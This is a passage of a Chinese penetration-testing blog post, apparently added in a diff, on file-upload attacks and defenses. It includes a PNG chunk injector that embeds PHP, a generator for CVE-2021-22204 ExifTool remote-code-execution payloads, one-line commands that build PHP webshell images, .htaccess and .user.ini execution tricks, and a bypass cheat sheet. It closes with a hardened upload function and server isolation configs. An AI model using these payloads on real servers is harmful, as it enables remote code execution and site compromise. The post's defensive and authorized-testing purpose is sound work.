f.write(data)</span><br></pre></td></tr></table></figure>
+
+<p><strong>警告</strong>：GD倾向于丢弃未知段，ImageMagick多数保留——需针对目标环境测试。</p>
+<h3 id="5-4-PNG-—-辅助块注入"><a href="#5-4-PNG-—-辅助块注入" class="headerlink" title="5.4 PNG — 辅助块注入"></a>5.4 PNG — 辅助块注入</h3><p>在PNG的IEND块前插入自定义辅助块（类型小写字母表示辅助块）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">inject_png_chunk</span>(<span class="params">in_path, out_path, php_code</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(in_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = <span class="built_in">bytearray</span>(f.read())</span><br><span class="line">    php = <span class="string">b&#x27;&lt;?php &#x27;</span> + php_code.encode() + <span class="string">b&#x27; __halt_compiler();&#x27;</span></span><br><span class="line">    pos = data.rfind(<span class="string">b&#x27;IEND&#x27;</span>)</span><br><span class="line">    chunk = <span class="built_in">len</span>(php).to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>) + <span class="string">b&#x27;tESt&#x27;</span> + php + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">4</span>  <span class="comment"># CRC占位</span></span><br><span class="line">    data[pos - <span class="number">4</span>:pos - <span class="number">4</span>] = chunk</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(out_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(data)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="6-ExifTool元数据注入-CVE-2021-22204"><a href="#6-ExifTool元数据注入-CVE-2021-22204" class="headerlink" title="6. ExifTool元数据注入 (CVE-2021-22204)"></a>6. ExifTool元数据注入 (CVE-2021-22204)</h2><h3 id="6-1-漏洞概述"><a href="#6-1-漏洞概述" class="headerlink" title="6.1 漏洞概述"></a>6.1 漏洞概述</h3><p>ExifTool是Perl编写的元数据工具，被CMS、图床广泛使用。CVE-2021-22204影响7.44–12.23版本：处理畸形DjVu文件时，ANT段的<code>ImageLength</code>字段被直接传入Perl <code>eval()</code>执行：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ExifTool内部处理（简化）</span></span><br><span class="line"><span class="variable">$val</span> = <span class="variable">$self</span>-&gt;GetValue(<span class="string">&#x27;ImageLength&#x27;</span>);</span><br><span class="line"><span class="keyword">eval</span> <span class="variable">$val</span>;   <span class="comment"># 危险！</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="6-2-PoC构造"><a href="#6-2-PoC构造" class="headerlink" title="6.2 PoC构造"></a>6.2 PoC构造</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;CVE-2021-22204 — 恶意DjVu生成器&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">path, cmd</span>):</span><br><span class="line">    djvu = <span class="string">b&#x27;AT&amp;TFORM\x00\x00\x00\x00DJVM&#x27;</span> + <span class="string">b&#x27;DJVMDIRM\x00\x00\x00\x00\x00\x01&#x27;</span></span><br><span class="line">    perl = <span class="string">f&#x27;(metadata &quot;\\c$&#123;&#123;system(\&#x27;<span class="subst">&#123;cmd&#125;</span>\&#x27;)&#125;&#125;;&quot;)&#x27;</span>.encode()</span><br><span class="line">    ant  = <span class="string">b&#x27;ANTz\x00\x00\x00\x00&#x27;</span> + struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="built_in">len</span>(perl)) + perl</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(djvu + ant)</span><br></pre></td></tr></table></figure>
+
+<p>上传后应用调用ExifTool读取元数据（提取GPS、Exif信息）时触发RCE。</p>
+<h3 id="6-3-其他注入点与防御"><a href="#6-3-其他注入点与防御" class="headerlink" title="6.3 其他注入点与防御"></a>6.3 其他注入点与防御</h3><p>Comment&#x2F;Artist字段直接嵌入<code>&lt;?php</code>可配合LFI利用；XMP元数据为XML格式可触发XXE。防御：升级ExifTool至12.24+，ImageMagick <code>policy.xml</code>禁用危险委托，沙箱化图像处理进程。</p>
+<hr>
+<h2 id="7-图片马实战速查"><a href="#7-图片马实战速查" class="headerlink" title="7. 图片马实战速查"></a>7. 图片马实战速查</h2><h3 id="7-1-快速生成"><a href="#7-1-快速生成" class="headerlink" title="7.1 快速生成"></a>7.1 快速生成</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># GIF马 — 绕过getimagesize最可靠</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;GIF89a&lt;?php @eval($_POST[&quot;pass&quot;]);?&gt;&#x27;</span> &gt; avatar.gif</span><br><span class="line"></span><br><span class="line"><span class="comment"># 合法GIF + PHP尾</span></span><br><span class="line">convert -size 1x1 xc:white base.gif</span><br><span class="line"><span class="built_in">cp</span> base.gif shell.php &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;&lt;?php @eval($_POST[&quot;x&quot;]);?&gt;&#x27;</span> &gt;&gt; shell.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># ExifTool写Comment（配合LFI）</span></span><br><span class="line">exiftool -Comment=<span class="string">&#x27;&lt;?php @eval($_POST[&quot;pass&quot;]);?&gt;&#x27;</span> photo.jpg</span><br><span class="line"></span><br><span class="line"><span class="comment"># PNG尾部追加</span></span><br><span class="line"><span class="built_in">cp</span> photo.png evil.php &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;&lt;?php @eval($_POST[&quot;x&quot;]);?&gt;&#x27;</span> &gt;&gt; evil.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-2-上传后解析路径"><a href="#7-2-上传后解析路径" class="headerlink" title="7.2 上传后解析路径"></a>7.2 上传后解析路径</h3><table>
+<thead>
+<tr>
+<th>场景</th>
+<th>文件名&#x2F;路径</th>
+<th>解析条件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Apache多后缀</td>
+<td><code>shell.php.gif</code></td>
+<td><code>AddHandler .php</code></td>
+</tr>
+<tr>
+<td>Nginx截断</td>
+<td><code>/uploads/shell.gif/1.php</code></td>
+<td><code>cgi.fix_pathinfo=1</code></td>
+</tr>
+<tr>
+<td>配合LFI</td>
+<td><code>?page=uploads/evil.gif</code></td>
+<td><code>include()</code>用户可控路径</td>
+</tr>
+</tbody></table>
+<h3 id="7-3-配置文件攻击"><a href="#7-3-配置文件攻击" class="headerlink" title="7.3 配置文件攻击"></a>7.3 配置文件攻击</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># .htaccess — 将.gif映射为PHP处理器</span></span><br><span class="line"><span class="attribute">AddType</span> application/x-httpd-php .gif</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; .user.ini (PHP-FPM) — 自动包含图片马</span></span><br><span class="line"><span class="attr">auto_prepend_file</span> = /var/www/uploads/shell.gif</span><br></pre></td></tr></table></figure>
+
+<p>前提是上传目录允许覆盖配置且Web服务器加载这些文件。</p>
+<hr>
+<h2 id="8-综合防御"><a href="#8-综合防御" class="headerlink" title="8. 综合防御"></a>8. 综合防御</h2><h3 id="8-1-纵深防御核心实现"><a href="#8-1-纵深防御核心实现" class="headerlink" title="8.1 纵深防御核心实现"></a>8.1 纵深防御核心实现</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">secureUpload</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$file</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">    <span class="variable">$map</span> = [<span class="string">&#x27;image/jpeg&#x27;</span>=&gt;<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;image/png&#x27;</span>=&gt;<span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;image/gif&#x27;</span>=&gt;<span class="string">&#x27;gif&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 服务端MIME检测（不信任客户端）</span></span><br><span class="line">    <span class="variable">$mime</span> = (<span class="keyword">new</span> <span class="title function_ invoke__">finfo</span>(FILEINFO_MIME_TYPE))-&gt;<span class="title function_ invoke__">file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$map</span>[<span class="variable">$mime</span>])) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&quot;类型拒绝: <span class="subst">$mime</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 扩展名白名单</span></span><br><span class="line">    <span class="variable">$ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION));</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$ext</span> !== <span class="variable">$map</span>[<span class="variable">$mime</span>]) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;扩展名与MIME不匹配&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 图像结构二次确认</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">getimagesize</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>])) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;非有效图像&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 强制二次渲染（核心防线）</span></span><br><span class="line">    <span class="variable">$dest</span> = <span class="string">&#x27;/var/www/uploads/&#x27;</span> . <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>)) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$ext</span>;</span><br><span class="line">    <span class="variable">$src</span> = <span class="keyword">match</span>(<span class="variable">$mime</span>) &#123;</span><br><span class="line">        <span class="string">&#x27;image/jpeg&#x27;</span> =&gt; <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>]),</span><br><span class="line">        <span class="string">&#x27;image/png&#x27;</span>  =&gt; <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>]),</span><br><span class="line">        <span class="string">&#x27;image/gif&#x27;</span>  =&gt; <span class="title function_ invoke__">imagecreatefromstring</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>])),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$src</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;解码失败&#x27;</span>);</span><br><span class="line">    <span class="variable">$ok</span> = <span class="keyword">match</span>(<span class="variable">$mime</span>) &#123;</span><br><span class="line">        <span class="string">&#x27;image/jpeg&#x27;</span> =&gt; <span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$src</span>, <span class="variable">$dest</span>, <span class="number">85</span>),</span><br><span class="line">        <span class="string">&#x27;image/png&#x27;</span>  =&gt; <span class="title function_ invoke__">imagepng</span>(<span class="variable">$src</span>, <span class="variable">$dest</span>, <span class="number">6</span>),</span><br><span class="line">        <span class="string">&#x27;image/gif&#x27;</span>  =&gt; <span class="title function_ invoke__">imagegif</span>(<span class="variable">$src</span>, <span class="variable">$dest</span>),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="title function_ invoke__">imagedestroy</span>(<span class="variable">$src</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$ok</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;写入失败&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 输出再确认</span></span><br><span class="line">    <span class="variable">$final</span> = (<span class="keyword">new</span> <span class="title function_ invoke__">finfo</span>(FILEINFO_MIME_TYPE))-&gt;<span class="title function_ invoke__">file</span>(<span class="variable">$dest</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$map</span>[<span class="variable">$final</span>])) &#123; <span class="title function_ invoke__">unlink</span>(<span class="variable">$dest</span>); <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;渲染后类型异常&#x27;</span>); &#125;</span><br><span class="line">    <span class="title function_ invoke__">chmod</span>(<span class="variable">$dest</span>, <span class="number">0644</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$dest</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-2-Web服务器隔离"><a href="#8-2-Web服务器隔离" class="headerlink" title="8.2 Web服务器隔离"></a>8.2 Web服务器隔离</h3><p><strong>Apache — 上传目录关闭PHP引擎</strong>：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Directory <span class="string">&quot;/var/www/uploads&quot;</span>&gt;</span></span><br><span class="line">    <span class="attribute">php_flag</span> engine <span class="literal">off</span></span><br><span class="line">    <span class="attribute">RemoveHandler</span> .php .phtml .php3 .php4 .php5 .php7</span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Nginx — 禁止执行脚本</strong>：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> /uploads/ &#123;</span><br><span class="line">    <span class="section">location</span> <span class="regexp">~* \.(php|phtml|php\d)$</span> &#123; <span class="attribute">deny</span> all; <span class="attribute">return</span> <span class="number">403</span>; &#125;</span><br><span class="line">    <span class="attribute">add_header</span> Content-Disposition <span class="string">&quot;attachment&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-3-补充措施"><a href="#8-3-补充措施" class="headerlink" title="8.3 补充措施"></a>8.3 补充措施</h3><p>对象存储隔离（S3&#x2F;OSS&#x2F;COS签名URL）、随机文件名、ClamAV扫描、ExifTool&#x2F;ImageMagick保持最新并限制危险委托、审计日志记录SHA256以便溯源。</p>
+<hr>
+<h2 id="9-绕过手法速查表"><a href="#9-绕过手法速查表" class="headerlink" title="9. 绕过手法速查表"></a>9. 绕过手法速查表</h2><table>
+<thead>
+<tr>
+<th>场景</th>
+<th>手法</th>
+<th>关键条件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>黑名单<code>.php</code></td>
+<td><code>.phtml</code> <code>.php5</code> <code>.pHp</code> <code>.php.</code> <code>.php::$DATA</code></td>
+<td>大小写差异&#x2F;解析器差异&#x2F;NTFS流</td>
+</tr>
+<tr>
+<td>白名单<code>.jpg</code></td>
+<td><code>shell.jpg.php</code></td>
+<td>Apache <code>AddHandler</code>多后缀</td>
+</tr>
+<tr>
+<td>白名单<code>.jpg</code></td>
+<td><code>/shell.jpg/1.php</code></td>
+<td>Nginx <code>cgi.fix_pathinfo=1</code></td>
+</tr>
+<tr>
+<td>Content-Type</td>
+<td>改为<code>image/jpeg</code></td>
+<td>客户端可控</td>
+</tr>
+<tr>
+<td>fileinfo</td>
+<td><code>GIF89a</code> + PHP</td>
+<td>仅检测文件头</td>
+</tr>
+<tr>
+<td><code>getimagesize()</code></td>
+<td>GIF头拼接</td>
+<td>GIF校验宽松</td>
+</tr>
+<tr>
+<td>NULL字节</td>
+<td><code>shell.php%00.jpg</code></td>
+<td>PHP &lt; 5.3.4</td>
+</tr>
+<tr>
+<td>二次渲染</td>
+<td>注释块&#x2F;APP段&#x2F;辅助块</td>
+<td>格式元数据保留</td>
+</tr>
+<tr>
+<td>.htaccess</td>
+<td><code>AddType application/x-httpd-php .gif</code></td>
+<td>Apache可覆盖配置</td>
+</tr>
+<tr>
+<td>ZIP上传</td>
+<td>ZIP内包含WebShell</td>
+<td>服务端自动解压</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="10-总结"><a href="#10-总结" class="headerlink" title="10. 总结"></a>10. 总结</h2><p>文件上传攻防的核心原则是<strong>零信任</strong>：不信任客户端元数据、不依赖单一校验、纵深防御。<strong>强制二次渲染</strong>与<strong>上传目录隔离</strong>是最有效的防线。保持GD&#x2F;ImageMagick&#x2F;ExifTool版本更新，关注CVE通告，在条件允许时将用户文件直传对象存储以彻底解除应用服务器风险。</p>
+<p>掌握绕过原理是为了构建更坚固的防御。请将这些技术仅用于合法安全研究和授权测试。</p>
+<hr>
+<p><strong>参考资料</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html">OWASP File Upload Cheat Sheet</a></li>
+<li><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2021-22204">CVE-2021-22204 — ExifTool DjVu RCE</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.getimagesize.php">PHP getimagesize() Manual</a></li>
+<li><a target="_blank" rel="noopener" href="https://imagemagick.org/script/security-policy.php">ImageMagick Security Policy</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/file-upload">PortSwigger: File Upload Vulnerabilities</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Post-exploit-cleanup/" rel="prev" title="后渗透：痕迹清理">
+                  <i class="fa fa-angle-left"></i> 后渗透：痕迹清理
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/CMS-WordPress-pentest/" rel="next" title="WordPress 安全测试实战">
+                  WordPress 安全测试实战 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
